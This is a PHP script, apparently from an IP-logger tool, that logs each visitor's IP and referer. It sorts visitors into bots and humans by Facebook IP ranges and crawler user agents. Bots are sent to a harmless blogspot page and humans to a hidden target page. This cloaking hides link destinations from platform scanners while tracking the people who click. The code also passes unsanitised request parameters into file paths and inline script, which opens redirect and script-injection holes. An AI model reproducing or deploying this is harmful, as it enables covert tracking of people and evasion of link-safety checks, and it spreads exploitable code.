<?php 
include("iplogger.php");

function startsWith($haystack, $needle) 
{
     return substr($haystack, 0, strlen($needle)) === $needle;
}

function endsWith($haystack, $needle) 
{
    $length = strlen($needle);
    if(!$length) return true;
    return substr($haystack, -$length) === $needle;
}

function IsValidIP() 
{ 
    //https://github.com/CybrDev/IP-Logger Get_IP
    $ip = "unknown";
    if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) $ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) $ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) $ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) $ip = $_SERVER['REMOTE_ADDR'];     
	if($ip == "::1") return true; //localhost
	if (startsWith($ip, '2a03:2880:') and endsWith($ip, '::face:b00c')) return false; //facebook ipv6
	return filter_var($ip, FILTER_VALIDATE_IP); //https://stackoverflow.com/a/6211175/11390822
} 

function IsValidUserAgent() 
{
    if (empty($_SERVER['HTTP_USER_AGENT'])) return false;
    $User_Agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    //$b means list of bots user agents, Mostly these words came in bots user agent, So we don't allow them.
    $Bots = explode(" ","http:// https:// + .com twitterbot facebot googlebot tumblr linkedinbot snapchat slurp yahoo microsoft bingbot framework bot");
    //$h means list of human user agents, Mostly these words came in human user agent, So we allow only them.
    $Humans =  explode(" ","apple firefox windows android linux chrome safari gecko iphone macintosh mac khtml browser nokia opera mozilla mobile network blackberry cpu outlook pc");
    foreach ($Bots as $Bot) 
	{
		if (substr_count($User_Agent , $Bot) > 0)
		{
			logger("detected as bot at $Bot");
			return false;
		}
	}
    foreach ($Humans as $Human) 
	{
		if (substr_count($User_Agent,$Human) > 0) 
		{
			logger("detected as human at $Human");
			return true;
		}
	}
    	 
}

function Start()
{
    echo "<script src=iplogger.js></script>";
    $Isbot = (IsValidIP() and IsValidUserAgent()) == false;
	
    LogData(
        $Isbot,
        (isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : null),
        str_replace('.html','',$_GET['filename'])
    );
	
	$link =    
	    $Isbot ?
        'https://tiplava.blogspot.com' :
        '.././websites/'.$_GET['filename'].(isset($_GET['redirect']) ? ('?redirect='. $_GET['redirect']) : '');
		
	logger("redirecting to $link");
    redirect (
        $link
    );
}

function logger($logs)
{
    echo "<script>console.log('$logs')</script>";
}

function redirect($link)
{
    echo "<script>window.location.replace('".$link."')</script>";
}

Start();

?>
